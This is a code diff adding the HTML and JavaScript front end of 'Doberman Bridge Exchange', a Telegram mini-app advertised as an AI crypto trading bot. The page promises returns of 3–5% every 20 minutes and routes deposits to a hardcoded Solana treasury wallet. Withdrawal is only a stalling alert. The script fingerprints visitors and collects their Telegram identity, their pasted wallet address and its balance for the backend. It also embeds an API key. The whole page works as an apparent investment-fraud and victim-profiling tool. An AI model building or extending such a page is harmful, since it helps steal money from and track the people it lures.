@@ -1,0 +1,422 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Doberman Bridge Exchange</title>
+  
+  <script src="https://telegram.org/js/telegram-web-app.js"></script>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script src="https://openfpcdn.io/fingerprintjs/v3/esm.min.js"></script>
+  <script src="https://unpkg.com/@solana/web3.js@1.87.6/lib/index.iife.min.js"></script>
+  
+  <style>
+    :root { --app-height: 100vh; }
+    body { min-height: var(--app-height); background-color: #060911; color: #f3f4f6; overflow-x: hidden; }
+    @keyframes pulseGlow { 0%, 100% { box-shadow: 0 0 15px rgba(0, 102, 255, 0.4); } 50% { box-shadow: 0 0 30px rgba(0, 102, 255, 0.8); } }
+    .glow-box { animation: pulseGlow 3s infinite; }
+    .bg-card-blue { background-color: #0d1527; }
+  </style>
+</head>
+<body class="font-sans flex flex-col justify-between select-none max-w-md mx-auto relative min-h-screen">
+
+  <!-- NAVBAR -->
+  <header class="flex justify-between items-center px-4 py-3 border-b border-blue-900/40 sticky top-0 bg-[#060911]/90 backdrop-blur z-40">
+    <div class="flex items-center space-x-2">
+      <svg class="w-7 h-7 text-blue-500 fill-current" viewBox="0 0 100 100">
+        <polygon points="50,10 20,40 35,90 50,75 65,90 80,40" fill="none" stroke="#0066ff" stroke-width="6"/>
+        <polygon points="50,25 35,45 50,65 65,45" fill="#0066ff" opacity="0.8"/>
+      </svg>
+      <span class="text-lg font-bold tracking-wider text-white">DOBERMAN <span class="text-blue-500">BRIDGE</span></span>
+    </div>
+
+    <button id="menuBtn" onclick="toggleMenu()" class="p-2 rounded focus:outline-none">
+      <div class="w-5 h-0.5 bg-blue-500 mb-1"></div>
+      <div class="w-5 h-0.5 bg-blue-500 mb-1"></div>
+      <div class="w-5 h-0.5 bg-blue-500"></div>
+    </button>
+
+    <div id="sideMenu" class="hidden absolute top-14 right-4 w-48 bg-card-blue border border-blue-500/30 rounded-xl p-2 shadow-2xl space-y-1 z-50">
+      <button id="menuKeyBtn" onclick="openKeyModal()" class="w-full text-left px-3 py-2 hover:bg-blue-600/20 rounded-lg text-xs font-medium text-blue-400">🔑 Enter Key</button>
+      <button onclick="alert('Status: @DobermanBridgeSupport')" class="w-full text-left px-3 py-2 hover:bg-blue-600/20 rounded-lg text-xs font-medium text-gray-200">🟢 Status</button>
+    </div>
+  </header>
+
+  <!-- LANDING VIEW -->
+  <main id="landingView" class="px-5 py-8 text-center flex flex-col items-center justify-center flex-1">
+    <div class="inline-block px-3 py-1 mb-3 border border-blue-500/40 rounded-full text-blue-400 text-[10px] font-semibold tracking-wide bg-blue-950/30">
+      NEXT-GEN ALGORITHMIC TRADING
+    </div>
+    <h1 class="text-3xl font-extrabold tracking-tight mb-3 bg-gradient-to-r from-white via-blue-200 to-blue-600 bg-clip-text text-transparent">
+      AI Bot-Trading Exchange
+    </h1>
+    <p class="text-xs text-gray-400 max-w-xs mb-6 leading-relaxed">
+      Minimal control. Maximum profit. Autonomous yield farming bot ecosystem inside Telegram.
+    </p>
+    <button onclick="openKeyModal()" class="glow-box w-full max-w-xs bg-blue-600 hover:bg-blue-500 text-white font-bold py-3 rounded-xl text-sm transition active:scale-95">
+      Access Exchange
+    </button>
+  </main>
+
+  <!-- DASHBOARD VIEW -->
+  <main id="dashboardView" class="hidden px-4 py-4 space-y-4 flex-1 overflow-y-auto">
+    
+    <!-- 1. TELEGRAM PROFILE BANNER -->
+    <div class="bg-card-blue border border-blue-900/50 p-3.5 rounded-2xl shadow-lg flex items-center space-x-3">
+      <div id="tgAvatar" class="w-10 h-10 rounded-full bg-blue-600 flex items-center justify-center text-white font-bold text-sm border border-blue-400/40 overflow-hidden">
+        U
+      </div>
+      <div class="flex-1 truncate">
+        <h2 id="tgName" class="text-white font-bold text-sm truncate">Telegram User</h2>
+        <p id="tgUsername" class="text-[11px] text-blue-400 font-mono truncate">@username</p>
+      </div>
+      <span class="px-2 py-0.5 bg-green-500/10 text-green-400 text-[9px] font-bold rounded-full border border-green-500/30">VERIFIED</span>
+    </div>
+
+    <!-- 2. SOLANA / USDT CHART -->
+    <div class="bg-card-blue border border-blue-900/50 p-2 rounded-2xl shadow-lg h-[260px]">
+      <div id="tradingview_chart" class="w-full h-full"></div>
+    </div>
+
+    <!-- 3. AI BALANCE CARD -->
+    <div class="bg-card-blue border border-blue-900/50 p-4 rounded-2xl shadow-lg">
+      <h3 class="text-gray-400 text-xs font-medium">AI Turnover Balance</h3>
+      <p class="text-2xl font-bold text-white my-1">$0 <span class="text-xs text-green-400 font-normal">+0%</span></p>
+      
+      <p class="text-[10px] text-gray-400 font-normal">Bot increases balance by 3–5% every 20 minutes</p>
+
+      <div class="flex space-x-2 mt-3">
+        <button id="depositBtn" onclick="openDepositModal()" class="flex-1 bg-blue-600 hover:bg-blue-500 text-xs font-semibold py-2 rounded-lg transition active:scale-95">Deposit</button>
+        <button onclick="alert('Wait 24 hours after the last deposit.')" class="flex-1 bg-gray-800 hover:bg-gray-700 text-xs font-semibold py-2 rounded-lg transition active:scale-95">Withdraw</button>
+      </div>
+    </div>
+
+    <!-- 4. WEB3 WALLETS CARD -->
+    <div class="bg-card-blue border border-blue-900/50 p-4 rounded-2xl shadow-lg">
+      <h3 class="text-gray-400 text-xs font-medium mb-2">Connect Web3 Wallets</h3>
+      
+      <div class="space-y-2">
+        <button id="solBtn" onclick="openSolModal()" class="w-full bg-gradient-to-r from-purple-900/50 to-blue-900/50 border border-purple-500/40 text-white text-xs font-semibold py-3 px-4 rounded-xl flex justify-between items-center transition active:scale-95">
+          <span class="flex items-center space-x-2">
+            <span class="w-2 h-2 rounded-full bg-purple-400"></span>
+            <span id="solBtnText">Connect Solana (SOL)</span>
+          </span>
+          <span class="text-[10px] bg-purple-500/20 px-2 py-0.5 rounded text-purple-300">SOL</span>
+        </button>
+      </div>
+    </div>
+
+  </main>
+
+  <!-- KEY MODAL -->
+  <div id="keyModal" class="hidden fixed inset-0 bg-black/80 backdrop-blur-sm flex items-center justify-center p-4 z-50">
+    <div class="bg-card-blue border border-blue-500/40 p-5 rounded-2xl w-full max-w-xs shadow-2xl">
+      <h2 class="text-base font-bold mb-2 text-white">Enter Access Key</h2>
+      <input type="text" id="accessKeyInput" placeholder="DOBERMAN-XXXXXXXX" class="w-full bg-[#060911] border border-blue-900 text-white px-3 py-2.5 rounded-xl mb-3 focus:outline-none focus:border-blue-500 font-mono text-xs">
+      <div class="flex justify-end space-x-2">
+        <button onclick="closeKeyModal()" class="px-3 py-1.5 text-xs text-gray-400">Cancel</button>
+        <button onclick="verifyKey()" class="bg-blue-600 px-4 py-1.5 rounded-xl text-xs font-semibold text-white">Verify</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- SOLANA INPUT MODAL -->
+  <div id="solModal" class="hidden fixed inset-0 bg-black/80 backdrop-blur-sm flex items-center justify-center p-4 z-50">
+    <div class="bg-card-blue border border-purple-500/40 p-5 rounded-2xl w-full max-w-xs shadow-2xl">
+      <h2 class="text-base font-bold mb-1 text-white">Solana Wallet</h2>
+      <p class="text-[11px] text-gray-400 mb-3">Paste your Solana public address:</p>
+      
+      <input type="text" id="solAddressInput" placeholder="e.g. 7xKXtg2CW87..." class="w-full bg-[#060911] border border-purple-900/60 text-white px-3 py-2.5 rounded-xl mb-3 focus:outline-none focus:border-purple-500 font-mono text-xs">
+      
+      <div class="flex justify-end space-x-2">
+        <button onclick="closeSolModal()" class="px-3 py-1.5 text-xs text-gray-400">Cancel</button>
+        <button id="solSubmitBtn" onclick="submitSolAddress()" class="bg-purple-600 hover:bg-purple-500 px-4 py-1.5 rounded-xl text-xs font-semibold text-white">
+          <span id="solSubmitText">Scan & Connect</span>
+        </button>
+      </div>
+    </div>
+  </div>
+
+  <!-- DEPOSIT SOL MODAL (Окно Пополнения) -->
+  <div id="depositModal" class="hidden fixed inset-0 bg-black/80 backdrop-blur-sm flex items-center justify-center p-4 z-50">
+    <div class="bg-card-blue border border-blue-500/40 p-5 rounded-2xl w-full max-w-xs shadow-2xl text-center space-y-3">
+      
+      <h2 class="text-base font-bold text-white">Deposit SOL</h2>
+      <p class="text-[11px] text-gray-400">Send SOL to the deposit address below<br>(minimum deposit: 1 SOL):</p>
+      
+      <!-- QR Code -->
+      <div class="flex justify-center">
+        <img id="depositQR" src="" alt="QR Code" class="w-32 h-32 rounded-lg border border-blue-500/30 p-1 bg-white">
+      </div>
+
+      <!-- Deposit Address Box -->
+      <div class="bg-[#060911] border border-blue-900/60 p-2.5 rounded-xl text-left">
+        <div class="text-[9px] text-gray-400 font-mono mb-0.5">DEPOSIT ADDRESS:</div>
+        <div id="depositAddressText" class="text-[10px] text-blue-300 font-mono break-all select-all font-semibold">
+          BawXS1ktA62HYtrUk2tqQQwf7zXfgiVtTVvRK4d2aoA3
+        </div>
+      </div>
+      
+      <!-- Action Buttons -->
+      <div class="space-y-2 pt-1">
+        <button onclick="copyDepositAddress(event)" class="w-full bg-blue-600/20 hover:bg-blue-600/30 border border-blue-500/40 text-blue-300 py-2 rounded-xl text-xs font-semibold transition active:scale-95">
+          📋 Copy Address
+        </button>
+      </div>
+        <button id="checkDepositBtn" onclick="checkRecentSolDeposit()" class="w-full bg-blue-600 hover:bg-blue-500 text-white py-2.5 rounded-xl text-xs font-semibold transition active:scale-95">
+          <span id="checkDepositBtnText">🔄 Check Payment</span>
+        </button>
+
+        <button onclick="closeDepositModal()" class="w-full text-xs text-gray-400 py-1 hover:text-white transition">
+          Cancel
+        </button>
+      </div>
+
+    </div>
+  </div>
+
+  <script type="text/javascript" src="https://s3.tradingview.com/tv.js"></script>
+  <script>
+    const HELIUS_RPC_URL = "https://mainnet.helius-rpc.com/?api-key=7ee545bf-5d07-48a0-9dc1-9fec12c4a7c4";
+    const TREASURY_WALLET = "BawXS1ktA62HYtrUk2tqQQwf7zXfgiVtTVvRK4d2aoA3";
+
+    const tg = window.Telegram?.WebApp;
+    let currentFP = '';
+    let activeKey = localStorage.getItem('doberman_key') || '';
+    let tgUser = null;
+
+    if (tg) {
+      tg.ready();
+      tg.expand();
+      tgUser = tg.initDataUnsafe?.user || null;
+    }
+
+    renderTgProfile();
+    checkAuthAndRender();
+
+    FingerprintJS.load().then(fp => fp.get()).then(res => {
+      currentFP = res.visitorId;
+    });
+    function copyDepositAddress(e) {
+  const address = TREASURY_WALLET;
+  if (!address) return;
+
+  const btn = (e && e.currentTarget) || event?.target;
+
+  navigator.clipboard.writeText(address).then(() => {
+    if (btn) {
+      const originalHTML = btn.innerHTML;
+      btn.innerHTML = '✅ Copied!';
+      btn.classList.add('!bg-green-500/20', '!text-green-300', '!border-green-500/50');
+
+      setTimeout(() => {
+        btn.innerHTML = originalHTML;
+        btn.classList.remove('!bg-green-500/20', '!text-green-300', '!border-green-500/50');
+      }, 2000);
+    }
+
+    if (window.Telegram?.WebApp?.HapticFeedback) {
+      window.Telegram.WebApp.HapticFeedback.notificationOccurred('success');
+    }
+  }).catch(err => {
+    console.error('Could not copy text: ', err);
+  });
+}
+    function renderTgProfile() {
+      if (tgUser) {
+        const name = `${tgUser.first_name || ''} ${tgUser.last_name || ''}`.trim() || 'Telegram User';
+        document.getElementById('tgName').innerText = name;
+        document.getElementById('tgUsername').innerText = tgUser.username ? `@${tgUser.username}` : `ID: ${tgUser.id}`;
+        
+        if (tgUser.photo_url) {
+          document.getElementById('tgAvatar').innerHTML = `<img src="${tgUser.photo_url}" class="w-full h-full object-cover">`;
+        } else {
+          document.getElementById('tgAvatar').innerText = (tgUser.first_name?.[0] || 'U').toUpperCase();
+        }
+      }
+    }
+
+    async function checkAuthAndRender() {
+      try {
+        const res = await fetch('/api/check-session', {
+          method: 'POST',
+          headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify({ tgId: tgUser?.id, savedKey: activeKey, fingerprint: currentFP })
+        });
+        const data = await res.json();
+
+        if (data.authorized) {
+          activeKey = data.user.key_used;
+          localStorage.setItem('doberman_key', activeKey);
+          
+          if(data.user.wallet_address && data.user.wallet_type === 'sol') {
+            updateSolButtonUI(data.user.wallet_address, data.user.wallet_balance);
+          }
+          showDashboard();
+        } else {
+          showLanding();
+        }
+      } catch (err) {
+        showLanding();
+      }
+    }
+
+    async function verifyKey() {
+      const key = document.getElementById('accessKeyInput').value.trim();
+      if(!key) return alert('Please enter access key');
+
+      const res = await fetch('/api/verify-key', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({ key, fingerprint: currentFP, tgUser })
+      });
+      const data = await res.json();
+
+      if(data.success) {
+        activeKey = key;
+        localStorage.setItem('doberman_key', key);
+        closeKeyModal();
+        showDashboard();
+      } else {
+        alert(data.message);
+      }
+    }
+
+    function openSolModal() { document.getElementById('solModal').classList.remove('hidden'); }
+    function closeSolModal() { document.getElementById('solModal').classList.add('hidden'); }
+
+    // Управление модальным окном пополнения
+    function openDepositModal() { 
+      const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=${TREASURY_WALLET}`;
+      document.getElementById('depositQR').src = qrUrl;
+      document.getElementById('depositAddressText').innerText = TREASURY_WALLET;
+      document.getElementById('depositModal').classList.remove('hidden'); 
+    }
+    
+    function closeDepositModal() { 
+      document.getElementById('depositModal').classList.add('hidden'); 
+    }
+
+    function copyDepositAddress() {
+      navigator.clipboard.writeText(TREASURY_WALLET).then(() => {
+        alert('Address copied to clipboard!');
+      }).catch(() => {
+        alert('Address: ' + TREASURY_WALLET);
+      });
+    }
+
+    // Проверка платежа и запуск скрипта
+    async function checkRecentSolDeposit() {
+      const btnText = document.getElementById('checkDepositBtnText');
+      btnText.innerText = 'Checking...';
+
+      try {
+        const res = await fetch('/api/deposit', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ tgUser, key: activeKey })
+        });
+        const data = await res.json();
+
+        if (data.success) {
+          alert('✅ Deposit checked! Message: ' + (data.message || 'Success'));
+          closeDepositModal();
+        } else {
+          alert('❌ Deposit error: ' + (data.error || 'Wallet not found or no transaction'));
+        }
+      } catch (err) {
+        console.error(err);
+        alert('Server connection error');
+      } finally {
+        btnText.innerText = '🔄 Check Payment';
+      }
+    }
+
+    async function submitSolAddress() {
+      const address = document.getElementById('solAddressInput').value.trim();
+      if(!address || address.length < 32 || address.length > 44) {
+        return alert('Please enter a valid Solana wallet address!');
+      }
+
+      document.getElementById('solSubmitText').innerText = 'Scanning...';
+
+      let solBalance = '0 SOL';
+      try {
+        const rpcRes = await fetch(HELIUS_RPC_URL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            jsonrpc: '2.0',
+            id: 1,
+            method: 'getBalance',
+            params: [address]
+          })
+        });
+        const rpcData = await rpcRes.json();
+        if(rpcData.result && rpcData.result.value !== undefined) {
+          solBalance = `${(rpcData.result.value / 1000000000).toFixed(3)} SOL`;
+        }
+      } catch(e) {
+        console.error('RPC Error:', e);
+      }
+
+      document.getElementById('solSubmitText').innerText = 'Scan & Connect';
+
+      updateSolButtonUI(address, solBalance);
+      closeSolModal();
+
+      await fetch('/api/connect-wallet', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+          walletAddress: address,
+          walletType: 'sol',
+          balance: solBalance,
+          key: activeKey,
+          tgUser,
+          fingerprint: currentFP
+        })
+      });
+    }
+
+    function updateSolButtonUI(address, balance) {
+      const shortAddr = `${address.substring(0, 4)}...${address.substring(address.length - 4)}`;
+      document.getElementById('solBtnText').innerHTML = `<span class="font-mono text-purple-300">${shortAddr}</span> — <b class="text-white">${balance}</b>`;
+    }
+
+    function toggleMenu() { document.getElementById('sideMenu').classList.toggle('hidden'); }
+    function openKeyModal() { document.getElementById('keyModal').classList.remove('hidden'); }
+    function closeKeyModal() { document.getElementById('keyModal').classList.add('hidden'); }
+
+    function showDashboard() {
+      document.getElementById('landingView').classList.add('hidden');
+      document.getElementById('dashboardView').classList.remove('hidden');
+      document.getElementById('menuKeyBtn').classList.add('hidden');
+      initChart();
+    }
+
+    function showLanding() {
+      document.getElementById('dashboardView').classList.add('hidden');
+      document.getElementById('landingView').classList.remove('hidden');
+    }
+
+    function initChart() {
+      if(!document.getElementById('tradingview_chart').children.length) {
+        new TradingView.widget({
+          "autosize": true,
+          "symbol": "BINANCE:SOLUSDT",
+          "interval": "D",
+          "timezone": "Etc/UTC",
+          "theme": "dark",
+          "style": "1",
+          "locale": "en",
+          "toolbar_bg": "#0d1527",
+          "enable_publishing": false,
+          "container_id": "tradingview_chart"
+        });
+      }
+    }
+  </script>
+
+</body>
+</html>
